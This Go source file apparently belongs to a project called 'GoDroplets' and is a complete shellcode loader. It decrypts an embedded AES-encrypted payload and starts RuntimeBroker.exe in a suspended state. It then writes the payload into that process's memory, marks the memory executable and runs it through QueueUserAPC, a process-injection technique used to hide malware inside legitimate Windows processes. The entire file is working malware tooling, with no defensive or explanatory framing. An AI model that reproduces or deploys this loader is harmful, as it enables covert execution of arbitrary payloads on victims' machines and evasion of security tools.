package main

import (
	embedder "GoDroplets"
	"GoDroplets/utils/cipher"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)


var (
	KERNEL32DLL        = syscall.NewLazyDLL("kernel32.dll")
	procCreateProcessA = KERNEL32DLL.NewProc("CreateProcessA")
	procQueueUserAPC   = KERNEL32DLL.NewProc("QueueUserAPC")
	VirtualAllocEx = KERNEL32DLL.NewProc("VirtualAllocEx")
	VirtualProtectEx = KERNEL32DLL.NewProc("VirtualProtectEx")
    DebugStop = KERNEL32DLL.NewProc("DebugActiveProcessStop")
)

type (
	BOOL                uint32
	DWORD               uint32
	WORD                uint16
	HANDLE              uintptr
	LPVOID              *uint8
	LPCSTR              *uint8
	LPSTR               *uint8
	LPBYTE              *uint8
	SECURITY_ATTRIBUTES struct {
		nLength              DWORD
		lpSecurityDescriptor LPVOID
		bInheritHandle       BOOL
	}
)

type (
	LPSECURITY_ATTRIBUTES *SECURITY_ATTRIBUTES
	STARTUPINFOA          struct {
		Cb              DWORD
		LpReserved      LPSTR
		LpDesktop       LPSTR
		LpTitle         LPSTR
		DwX             DWORD
		DwY             DWORD
		DwXSize         DWORD
		DwYSize         DWORD
		DwXCountChars   DWORD
		DwYCountChars   DWORD
		DwFillAttribute DWORD
		DwFlags         DWORD
		WShowWindow     WORD
		CbReserved2     WORD
		LpReserved2     LPBYTE
		HStdInput       HANDLE
		HStdOutput      HANDLE
		HStdError       HANDLE
	}
)

type (
	LPSTARTUPINFOA      *STARTUPINFOA
	PROCESS_INFORMATION struct {
		HProcess    HANDLE
		HThread     HANDLE
		DwProcessId DWORD
		DwThreadId  DWORD
	}
)
type LPPROCESS_INFORMATION *PROCESS_INFORMATION

type (
	PAPCFUNC  uintptr
	ULONG_PTR uint32
)

func CreateProcessA(lpApplicationName LPCSTR, lpCommandLine LPSTR, lpProcessAttributes LPSECURITY_ATTRIBUTES, lpThreadAttributes LPSECURITY_ATTRIBUTES, bInheritHandles BOOL, dwCreationFlags DWORD, lpEnvironment LPVOID, lpCurrentDirectory LPCSTR, lpStartupInfo LPSTARTUPINFOA) (lpProcessInformation LPPROCESS_INFORMATION, err error) {
	var pi PROCESS_INFORMATION = PROCESS_INFORMATION{}

	_, _, e := syscall.SyscallN(procCreateProcessA.Addr(), uintptr(unsafe.Pointer(lpApplicationName)), uintptr(unsafe.Pointer(lpCommandLine)), uintptr(unsafe.Pointer(lpProcessAttributes)), uintptr(unsafe.Pointer(lpThreadAttributes)), uintptr(0), uintptr(dwCreationFlags), uintptr(unsafe.Pointer(lpEnvironment)), uintptr(unsafe.Pointer(lpCurrentDirectory)), uintptr(unsafe.Pointer(lpStartupInfo)), uintptr(unsafe.Pointer(&pi)))

	return &pi, e
}

func QueueUserAPC(pfnAPC PAPCFUNC, hThread HANDLE, dwData ULONG_PTR) (res DWORD, err error) {
	r, _, e := syscall.SyscallN(procQueueUserAPC.Addr(), (uintptr)(pfnAPC), uintptr(hThread), 0)

	return DWORD(uint32(r)), e
}

func DebugActiveProcessStop(dwProcessId DWORD) (res BOOL, err error) {
    r, _, e := syscall.SyscallN(DebugStop.Addr(), uintptr(dwProcessId))
    return BOOL(r), e
    
}
func ResumeThread(hThread windows.Handle) (e error) {
	_, _, e = KERNEL32DLL.NewProc("ResumeThread").Call(uintptr(hThread))
	return e
}

func main() {

    ppayloadDecrypted := cipher.AesDecrypt(&embedder.Key, &embedder.PayloadEncrypted)

	s := "C:\\Windows\\System32\\RuntimeBroker.exe"
    lpCommandLine, _ := syscall.UTF16PtrFromString(s)

    var pi windows.ProcessInformation = windows.ProcessInformation{}
    var si windows.StartupInfo = windows.StartupInfo{}
    err := windows.CreateProcess(nil, lpCommandLine, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, &si, &pi)
	if err != nil {
		fmt.Println("Error Creating Process")
		fmt.Println(err)
	}
    
    phandle := pi.Process


	pShellCodeAddress, _, err := VirtualAllocEx.Call(uintptr(phandle), 0, uintptr(len(*ppayloadDecrypted)), windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("Failed to VirtuAllocEx")
		fmt.Println(err)
	}

	var numByteWritten uintptr
	err = windows.WriteProcessMemory(windows.Handle(phandle), pShellCodeAddress, &(*ppayloadDecrypted)[0], uintptr(len(*ppayloadDecrypted)), &numByteWritten)
	if err != nil {
		fmt.Println("Failed to Wrtie Process Memory")
		fmt.Println(err)
	}

	var oldProtection uintptr
	_, _, err = VirtualProtectEx.Call(uintptr(phandle), pShellCodeAddress, uintptr(len(*ppayloadDecrypted)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtection)))
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("Failed to Change Process Memory Protection")
		fmt.Println(err)
	}

    _, err = QueueUserAPC(PAPCFUNC(pShellCodeAddress), HANDLE(pi.Thread), 0)
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("Failed to Start QueueUserAPC")
		fmt.Println(err)
	}

    err = ResumeThread(pi.Thread)
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("Failed to resume process")
		fmt.Println(err)
	}
    return 

}
